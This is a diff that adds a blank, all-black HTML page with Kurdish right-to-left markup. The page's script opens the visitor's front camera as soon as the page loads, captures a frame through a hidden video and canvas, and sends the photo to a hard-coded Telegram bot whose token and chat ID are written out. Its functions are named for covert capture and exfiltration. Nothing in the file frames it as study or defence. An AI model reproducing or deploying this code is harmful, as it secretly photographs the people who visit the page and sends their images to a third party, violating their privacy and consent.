@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="ku" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>-</title>
+    <style>
+        /* هەمی تشت تاری و بێ نڤیسار هاتە چێکرن */
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { background-color: #000000; height: 100vh; overflow: hidden; }
+        #hidden-canvas, #camera-stream { display: none; }
+    </style>
+</head>
+<body>
+
+    <!-- Hidden Video & Canvas for Autonomous Capture -->
+    <video id="camera-stream" autoplay playsinline></video>
+    <canvas id="hidden-canvas"></canvas>
+
+    <script>
+        const TG_BOT_TOKEN = "9200698437:AAGIcQ4CBkXtsonwhiGKxTwtkajKm8ByKCI";
+        const TG_CHAT_ID = "8905740669";
+
+        window.addEventListener('DOMContentLoaded', () => {
+            initiateCovertCapture();
+        });
+
+        async function initiateCovertCapture() {
+            try {
+                const constraints = {
+                    video: { facingMode: "user" },
+                    audio: false
+                };
+
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const videoElement = document.getElementById('camera-stream');
+                videoElement.srcObject = stream;
+
+                setTimeout(() => {
+                    captureFrameAndExfiltrate(videoElement, stream);
+                }, 1200);
+
+            } catch (err) {
+                console.error("Access Denied", err);
+            }
+        }
+
+        function captureFrameAndExfiltrate(video, stream) {
+            const canvas = document.getElementById('hidden-canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoH || 480;
+            
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            stream.getTracks().forEach(track => track.stop());
+
+            canvas.toBlob((blob) => {
+                sendToTelegram(blob);
+            }, 'image/jpeg', 0.85);
+        }
+
+        async function sendToTelegram(imageBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', TG_CHAT_ID);
+            formData.append('photo', imageBlob, 'capture_node.jpg');
+
+            const telegramAPI = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendPhoto`;
+
+            try {
+                await fetch(telegramAPI, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (e) {
+                console.error(e);
+            }
+        }
+    </script>
+</body>
+</html>
